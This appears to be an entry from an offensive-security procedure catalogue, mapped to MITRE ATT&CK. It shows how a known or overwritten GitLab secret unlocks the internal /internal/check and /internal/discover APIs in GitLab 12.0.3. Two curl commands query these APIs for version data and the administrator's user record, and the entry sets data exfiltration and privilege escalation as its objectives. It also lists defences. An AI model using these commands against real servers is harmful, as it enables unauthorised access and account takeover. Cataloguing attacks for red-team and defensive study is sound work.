---
id: proc-access-internal-apis
tags:
  - privilege-escalation
  - internal-api
  - secrets
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-internal-check]]'
  - '[[commands/curl-internal-discover]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:08.780Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Access-Internal-APIs-with-Overwritten-Secrets

## Summary

This procedure leverages the known overwritten secret to authenticate to GitLab's internal APIs, retrieving sensitive information like user details and 2FA codes.

## Description

With secrets like admin.secret or gitlab_shell_secret set to known hashes, endpoints like /internal/check and /internal/discover become accessible, enabling data exfiltration and escalation in GitLab 12.0.3.

## Requirements

1. Known secret value from overwrite
2. Internal API endpoints exposed
3. curl for requests

## Defense

Defensive measures and detection strategies:

- Restrict internal APIs to localhost
- Rotate secrets frequently
- Monitor for anomalous internal requests

## Objectives

1. Authenticate with known secrets
2. Exfiltrate user/system data
3. Achieve privilege escalation

## Instructions

### Step 1: Check Internal Access

**Context**: Test authentication with secret_token.

**Command** ([[commands/curl-internal-check]]):
```bash
curl -s 'http://target/api/v4/internal/check?secret_token=known_hash'
```

> Returns GitLab version and status JSON.

### Step 2: Discover User Info

**Context**: Retrieve details for user_id=1 (admin).

**Command** ([[commands/curl-internal-discover]]):
```bash
curl -s 'http://target/api/v4/internal/discover?secret_token=known_hash&user_id=1'
```

> Outputs user JSON, e.g., {"id":1,"name":"Administrator"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Valid Accounts]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[Default Accounts]]

## Commands Used

- [[commands/curl-internal-check]]
- [[commands/curl-internal-discover]]

## Tools Used

- [[tools/curl]]

## Tags

- [[privilege-escalation]]
- [[internal-api]]
